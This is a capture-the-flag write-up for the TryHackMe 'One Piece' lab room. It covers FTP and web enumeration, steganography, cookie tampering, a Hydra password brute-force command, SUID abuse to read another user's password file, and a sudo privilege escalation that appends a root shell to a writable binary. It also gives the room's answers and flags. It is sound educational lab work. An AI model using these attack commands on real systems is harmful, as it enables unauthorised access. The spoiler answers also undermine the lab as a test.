# TryHackMe — One Piece 🏴‍☠️

**Room:** One Piece  
**Platform:** TryHackMe  
**Category:** Capture the Flag (CTF)  
**Difficulty:** Medium  
**Status:** Completed ✅


<img width="1351" height="139" alt="Forside" src="https://github.com/user-attachments/assets/a45b2ce6-dd4f-4d1b-aade-1d8a0c3b181c" />


## Overview

One Piece is a story-driven TryHackMe CTF inspired by the anime and manga series. The objective is to navigate through the New World, collect four Road Poneglyphs, reach Laugh Tale, defeat Marshall D. Teach, and ultimately discover the One Piece.

The challenge combines several cybersecurity techniques, including network enumeration, web reconnaissance, steganography, password attacks, encoding and decoding, Linux permissions, and privilege escalation.

This write-up documents my approach, the tools I used, the challenges I encountered, and how I eventually obtained root access.

> **Spoiler warning:** This write-up contains the solutions, credentials, and final flags for the room.

---

## 1. Initial Reconnaissance

I started by scanning the target machine to identify open ports and available services.

**Target IP:** `10.112.190.5`

```bash
nmap -A 10.112.190.5
```

The scan revealed three main services:

| Port | Service | Details |
|------|---------|---------|
| 21 | FTP | vsftpd 3.0.3 |
| 22 | SSH | OpenSSH 7.6p1 |
| 80 | HTTP | Apache 2.4.29 |

The FTP service allowed anonymous login, making it a promising starting point.

### Anonymous FTP Access

```bash
ftp 10.112.190.5
```

I authenticated using:

```text
Username: anonymous
Password: anonymous
```

After connecting, I listed the files, including hidden entries:

```bash
ls -all
```

I discovered a hidden directory:

```text
.the_whale_tree
```

Inside it were two interesting files:

```text
.secret_room.txt
.road_poneglyph.jpeg
```

The hidden text file contained information about the four Road Poneglyphs.

This also provided the answer to the first question:

**What is the name of the tree that contains the 1st Road Poneglyph?**

```text
Whale Tree
```

---

## 2. Extracting the First Road Poneglyph

I downloaded the JPEG file using FTP:

```bash
get .road_poneglyph.jpeg
```

I first investigated the image using:

```bash
exiftool .road_poneglyph.jpeg
strings .road_poneglyph.jpeg
```

Neither command revealed an obvious hidden message.

I then examined the image using Steghide:

```bash
steghide info .road_poneglyph.jpeg
```

This revealed that the image contained an embedded file.

I extracted it using an empty passphrase:

```bash
steghide extract -sf .road_poneglyph.jpeg -p ""
```

The extracted file was:

```text
road_poneglyphe1.txt
```

Its contents were a long encoded string beginning with:

```text
FUWS2LJNEAWS2LJNFUQC4LJNFUWSALRN...
```

The first Road Poneglyph had been recovered.

However, decoding the string individually did not immediately produce a readable message.

I saved the encoded content for later investigation.

---

## 3. Exploring the Apache Sea

Next, I investigated the web service running on port 80.

```text
http://10.112.190.5/
```

I reviewed the HTML source and performed content discovery.

The initial page contained encoded information, including a Base32 string hidden in an HTML comment.

After decoding it with CyberChef, I obtained a message suggesting that Nami had lost something among 3472 possible places.

I also investigated web resources and eventually discovered the Dressrosa page:

```text
/dr3ssr0s4.html
```

### Dressrosa — Donquixote Doflamingo

The page introduced Donquixote Doflamingo.

This answered another TryHackMe question:

**What is the name of the 1st pirate you meet navigating the Apache Sea?**

```text
Donquixote Doflamingo
```

I inspected the stylesheet associated with the page.

![King Kong Gun Source Code](king_kong_sourcecode.png)

The CSS referenced an interesting image:

```css
background-image: url("../king_kong_gun.jpg");
```

I downloaded and examined the image.

```bash
strings king_kong_gun.jpg
```

This revealed another image path:

```text
/ko.jpg
```

I then investigated that image:

```bash
curl -s http://10.112.190.5/ko.jpg -o ko.jpg
strings ko.jpg
```

The output contained a new clue:

```text
Congratulations, this is the Log Pose that should lead you to the next island: /wh0l3_c4k3.php
```

The next destination was Whole Cake Island.

---


## 4. Whole Cake Island — Big Mom

I navigated to:

```text
http://10.112.190.5/wh0l3_c4k3.php
```

The page introduced **Big Mom**, one of the Four Emperors.

While inspecting the HTML source, I discovered an interesting clue:

```html
<!--Big Mom likes cakes-->
```

The page also contained a form asking:

```text
What do you do?
```

I initially experimented with submitting different inputs through the form using `curl`.

For example:

```bash
curl -s -X POST \
  -d "text_input=cake" \
  http://10.112.190.5/wh0l3_c4k3.php
```

However, the server responded with:

```text
I did not expect that.
```

Since simply submitting `cake` did not work, I decided to investigate the application further.

### Cookie Manipulation

I opened **Firefox Developer Tools** and navigated to **Storage → Cookies**.

Here, I discovered a cookie named `cookie` with the value `NoCakeForYou`.


<img width="1250" height="247" alt="endret_cookie_til_cake_for_you" src="https://github.com/user-attachments/assets/0ac5ecfb-94be-41c0-a490-bcc2ebf67a22" />

*Figure: Inspecting the original `NoCakeForYou` cookie before modifying its value.*

The cookie value caught my attention because it seemed directly related to the HTML comment about Big Mom liking cakes.

Instead of continuing to guess form inputs, I decided to manipulate the cookie itself.

I changed its value from:

```text
NoCakeForYou
```

to:

```text
CakeForYou
```

After modifying the cookie and interacting with the page again, I successfully retrieved the second Road Poneglyph!

The server returned:

```text
You successfully stole a copy of the 2nd Road Poneglyph
```

This was followed by another long encoded string, which I saved for later analysis alongside the first Road Poneglyph.


### Continuing the Journey

After obtaining the second Road Poneglyph, the page revealed that Luffy had successfully escaped Big Mom.

However, he did not have a Log Pose to reach Kaido's island and was forced to continue sailing without knowing his destination.

Eventually, he arrived on a mysterious island:

```text
/r4nd0m.html
```

This provided the next step in the challenge.

**What is the name of the 2nd island you reach navigating the Apache Sea?**

```text
Whole Cake
```

---


## 5. Buggy the Clown — Brain Teaser

After reaching the mysterious island, I encountered Buggy the Clown.

Buggy offered two games:

- Brick Breaker
- Brain Teaser

He promised to provide a Log Pose to Onigashima if I could beat him.

I initially explored the games through the browser.

The Brick Breaker game was not particularly cooperative, so I investigated Brain Teaser instead.

### Inspecting the 3D Cube

Brain Teaser displayed a rotating 3D cube.

Instead of trying to solve the puzzle visually, I opened Firefox Developer Tools and inspected the HTML structure.


<img width="1534" height="939" alt="inspector" src="https://github.com/user-attachments/assets/9d54ed58-0136-4869-8b9a-374a4212daf9" />


The cube contained multiple HTML elements representing its faces.

One of them was:

```html
<div id="back" class="cube_face">
```

Inside the element, I discovered:

```text
Log Pose: /0n1g4sh1m4.php
```

The clue was hidden on the back of the cube, but it was directly accessible in the DOM.


I now had the next destination.

**What is the name of the friend you meet navigating the Apache Sea?**

```text
Buggy the Clown
```

---

## 6. Onigashima — Kaido

I navigated to:

```text
http://10.112.190.5/0n1g4sh1m4.php
```

The page introduced Kaido of the Beasts, another Emperor.

The page contained an interesting statement:

```text
Speaking about brute force, Kaido is unbeatable.
```

There were two available forms:

1. A login form
2. A file upload form

### Investigating the Login

I first submitted deliberately incorrect credentials.

```bash
curl -s \
  -d "user=test&password=test&submit_creds=Login" \
  http://10.112.190.5/0n1g4sh1m4.php
```

The server added two error messages:

```html
<p>ERROR</p>
<p>ERROR</p>
```

This confirmed that the login functionality processed the submitted data.

I also examined the upload form, but my initial test uploads produced no visible difference in the HTML response.

I decided to investigate Kaido's image instead.

### Finding Hidden Data with StegSeek

I downloaded:

```text
kaido.jpeg
```

I initially tried:

```bash
steghide extract -sf kaido.jpeg
```

However, extraction failed without the correct passphrase.

I then tried StegSeek:

```bash
stegseek kaido.jpeg
```

This produced:

```text
Found passphrase: "imabeast"
Original filename: "kaido_login.txt"
Extracting to "kaido.jpeg.out"
```

I read the extracted file:

```bash
cat kaido.jpeg.out
```

The result was:

```text
Username:K1ng_0f_th3_B3@sts
```

I had discovered Kaido's username.

### Password Attack with Hydra

I first tested whether the StegSeek passphrase had been reused as the login password.

It had not.

I then used Hydra with the RockYou password list.

```bash
hydra \
  -l 'K1ng_0f_th3_B3@sts' \
  -P /usr/share/wordlists/rockyou.txt \
  10.112.190.5 \
  http-post-form \
  '/0n1g4sh1m4.php:user=^USER^&password=^PASS^&submit_creds=Login:F=ERROR' \
  -t 4 -f
```

The parameters included:

| Parameter | Purpose |
|-----------|---------|
| `-l` | Specify the known username |
| `-P` | Specify the password wordlist |
| `http-post-form` | Attack the HTTP login form |
| `^USER^` | Username placeholder |
| `^PASS^` | Password placeholder |
| `F=ERROR` | Identify unsuccessful responses |
| `-t 4` | Use four concurrent tasks |
| `-f` | Stop after finding a possible match |

Hydra identified a matching password:

```text
Username: K1ng_0f_th3_B3@sts
Password: thebeast
```

I verified the credentials with another POST request:

```bash
curl -s \
  --data-urlencode 'user=K1ng_0f_th3_B3@sts' \
  --data-urlencode 'password=thebeast' \
  -d 'submit_creds=Login' \
  http://10.112.190.5/0n1g4sh1m4.php
```

The response confirmed:

```text
You successfully stole a copy of the 3rd Road Poneglyph
```

**What is the name of the 2nd Emperor you meet navigating the Apache Sea?**

```text
Kaido
```

---

## 7. Decoding the Four Road Poneglyphs

Throughout the challenge, I collected four long encoded strings.

The last Poneglyph was associated with an otherwise unspecified location. I later confirmed its content in a file named:

```text
/var/www/html/unspecified
```

The crucial discovery was that the encoded strings needed to be **combined before decoding**.

Trying to decode each Poneglyph individually had not produced the complete message.

I combined all four strings in the correct sequence and used CyberChef.

### CyberChef Recipe

The successful decoding sequence was:

```text
From Base32
    ↓
From Morse Code
    ↓
From Binary
    ↓
From Hex
    ↓
From Base58
    ↓
From Base64
```

The resulting plaintext was:

```text
M0nk3y_D_7uffy:1_w1ll_b3_th3_p1r@t3_k1ng!
```

This contained SSH credentials:

```text
Username: M0nk3y_D_7uffy
Password: 1_w1ll_b3_th3_p1r@t3_k1ng!
```

The challenge used several encoding layers, not encryption in the cryptographic sense.

This was one of my favourite parts of the room because the solution required combining information collected throughout the entire challenge.

---

## 8. Reaching Laugh Tale via SSH

With the decoded credentials, I attempted SSH access.

```bash
ssh M0nk3y_D_7uffy@10.112.190.5
```

The connection was successful.


<img width="923" height="376" alt="ssh monkey_D" src="https://github.com/user-attachments/assets/1222caa1-95b2-4e09-83a2-405c0a668d46" />


After logging in, I inspected the home directory.

```bash
ls -la
cat laugh_tale.txt
```

The text file explained that Luffy had finally arrived at Laugh Tale.

However, another pirate was already there:

```text
Marshall D Teach
```

The file described Teach as one of the Four Emperors and explained that Luffy wanted revenge.

**Who is on Laugh Tale at the same time as Luffy?**

```text
Marshall D Teach
```

---

## 9. Linux Enumeration and SUID Privilege Escalation

I inspected the available home directories:

```bash
cd /home
ls
```

The result was:

```text
luffy
teach
```

Inside `/home/teach`, I discovered:

```text
luffy_vs_teach.txt
```

However, attempting to read it returned:

```text
Permission denied
```

### Enumerating SUID Binaries

I searched for SUID executables:

```bash
find / -perm -u=s 2>/dev/null
```

Among the standard Linux executables, one unusual program stood out:

```text
/usr/bin/gomugomunooo_king_kobraaa
```

This was clearly themed around Luffy's Gomu Gomu no King Cobra attack.

I executed the program:

```bash
/usr/bin/gomugomunooo_king_kobraaa
```

Unexpectedly, it launched an interactive Python interpreter.

```text
Python 3.6.9
>>>
```

### Investigating the Effective User ID

Inside Python, I checked the real and effective user IDs.

```python
import os
print(os.getuid(), os.geteuid())
```

Result:

```text
1001 1000
```

The effective UID was different from the real UID.

I identified the user associated with EUID 1000:

```python
import pwd
print(pwd.getpwuid(os.geteuid()).pw_name)
```

Result:

```text
7uffy_vs_T3@ch
```

The program was running with the effective permissions of another user.


### Reading the Protected File

Using Python, I attempted to read the previously inaccessible file:

```python
print(open('/home/teach/luffy_vs_teach.txt').read())
```

This time, it worked!

The file described the fight between Luffy and Teach.

The important line was:

```text
But in the end, Luffy thanks to his willpower won the fight.
```

This answered the next question.

**What allowed Luffy to win the fight?**

```text
Willpower
```

---

## 10. Discovering Another User's Credentials

Since the Python interpreter was running with another user's effective permissions, I investigated the Teach home directory.

```python
print(os.listdir('/home/teach'))
```

Among the files, I noticed:

```text
.password.txt
```

I read it using Python:

```python
print(open('/home/teach/.password.txt').read())
```

The file contained:

```text
7uffy_vs_T3@ch:Wh0_w1ll_b3_th3_k1ng?
```

This appeared to be another username-password combination.

I exited Python and switched users:

```bash
su '7uffy_vs_T3@ch'
```

Password:

```text
Wh0_w1ll_b3_th3_k1ng?
```

The authentication was successful.

I now had a normal shell as:

```text
7uffy_vs_T3@ch
```

---

## 11. Sudo Enumeration

I checked the user's sudo privileges:

```bash
sudo -l
```

The result included:

```text
User 7uffy_vs_T3@ch may run the following commands on Laugh-Tale:

    (ALL) /usr/local/bin/less
```

This indicated that the user could execute `/usr/local/bin/less` with sudo privileges.

At first, it appeared that I might be able to escape from `less` into a root shell.

However, running it produced something unexpected:

```bash
sudo /usr/local/bin/less /etc/hosts
```

Output:

```text
Sorry, I can't tell you where is the One Piece
```

Clearly, this was not a normal `less` executable.

### Investigating File Permissions

I inspected the executable:

```bash
ls -l /usr/local/bin/less
file /usr/local/bin/less
```

The permissions were:

```text
-rwxrwx-wx 1 root root 67 /usr/local/bin/less
```

The unusual permission configuration was important.

The file was owned by root, but other users had write and execute permissions.

I attempted to overwrite it:

```bash
printf '#!/bin/sh\nexec /bin/bash\n' > /usr/local/bin/less
```

This failed:

```text
Operation not permitted
```

I suspected that the file had additional filesystem protections, possibly an append-only attribute.

I attempted to inspect its attributes using `lsattr`, but received a permission error.

### Testing Append Permissions

Instead of overwriting the file, I tested whether it could be opened in append mode.

```bash
: >> /usr/local/bin/less && echo "Append works!"
```

The result was:

```text
Append works!
```

This showed that the file could be opened for appending, even though overwriting it had failed.

The observed behaviour was consistent with append-only restrictions, although I could not directly verify the filesystem attribute.

---

## 12. Root Privilege Escalation

Since the sudo configuration allowed execution of the file as root, and I could append content to it, I added a command to start a privileged Bash shell.

```bash
printf '\nexec /bin/bash -p\n' >> /usr/local/bin/less
```

The `-p` option tells Bash to preserve privileges.

I then executed the modified program with sudo:

```bash
sudo /usr/local/bin/less
```

The program initially printed:

```text
Sorry, I can't tell you where is the One Piece
```

But immediately afterwards, the shell prompt changed to:

```text
root@Laugh-Tale:/home#
```

**Root access obtained!**

---

## 13. Finding the One Piece

After obtaining root access, I began searching for the final treasure.

I investigated several locations, including:

```bash
ls -la /root
cat /root/.bash_history
ls -la /
ls -laR /srv
ls -la /var/www/html
```

I also searched for filenames containing terms such as:

```text
piece
treasure
flag
```

The initial searches returned numerous unrelated system files.

I confirmed that `/var/www/html/unspecified` contained the last Road Poneglyph, which I had already used for decoding.

After further investigation, I consulted public walkthrough material for a hint about the final file's location.

The treasure was located at:

```text
/usr/share/mysterious/on3_p1ec3.txt
```

With root access, I read the file:

```bash
cat /usr/share/mysterious/on3_p1ec3.txt
```

The result was:

```text
One Piece: S3cr3ts_0f_tH3_W0rlD_&_0f_Th3_P@st$
```

<img width="816" height="146" alt="Siste flagget" src="https://github.com/user-attachments/assets/5b01f2cc-6852-4fba-93bc-0cb639cc09c1" />



**The One Piece had finally been found!**

---

## 14. Answers

### Road Poneglyphs

| Question | Answer |
|----------|--------|
| Name of the tree containing the first Road Poneglyph | Whale Tree |
| First pirate met while navigating the Apache Sea | Donquixote Doflamingo |
| Second island reached in the Apache Sea | Whole Cake |
| Friend met during the journey | Buggy the Clown |
| Second Emperor encountered | Kaido |
| Hidden message of the four Road Poneglyphs | `M0nk3y_D_7uffy:1_w1ll_b3_th3_p1r@t3_k1ng!` |

### Laugh Tale

| Question | Answer |
|----------|--------|
| Who is on Laugh Tale at the same time as Luffy? | Marshall D Teach |
| What allowed Luffy to win the fight? | Willpower |
| What is the One Piece? | `S3cr3ts_0f_tH3_W0rlD_&_0f_Th3_P@st$` |

---

## 15. Tools and Techniques Used

| Tool / Technique | Purpose |
|------------------|---------|
| Nmap | Identify open ports and services |
| FTP | Access anonymously available files |
| Curl | Send GET and POST requests |
| Gobuster / Content Discovery | Investigate hidden web resources |
| Firefox Developer Tools | Inspect HTML, JavaScript, CSS and cookies |
| ExifTool | Examine image metadata |
| Strings | Identify readable text embedded in files |
| Steghide | Identify and extract steganographic content |
| StegSeek | Recover a steganographic passphrase |
| Hydra | Test passwords against the HTTP login |
| CyberChef | Decode multiple layers of encoded data |
| SSH | Establish remote shell access |
| Python | Inspect effective privileges and access files |
| Linux enumeration | Identify unusual files, permissions and executables |
| SUID exploitation | Gain another user's effective permissions |
| Sudo misconfiguration | Escalate privileges to root |

---


## Conclusion

The One Piece room was an enjoyable, multi-stage CTF that combined web exploitation, steganography, authentication attacks, decoding, Linux enumeration and privilege escalation into one connected storyline.

I especially enjoyed the challenge of piecing together the four Road Poneglyphs and discovering how the SUID and sudo misconfigurations could be chained to obtain root access.

The room also reinforced an important lesson: **when one approach stops working, investigate the underlying behaviour rather than simply repeating the same attempt.**

From anonymous FTP access to root on Laugh Tale, each stage required a different way of thinking.

**Room completed — One Piece found! 🏴‍☠️**

---

*This write-up documents an authorised TryHackMe lab environment. All testing was conducted for educational purposes.*
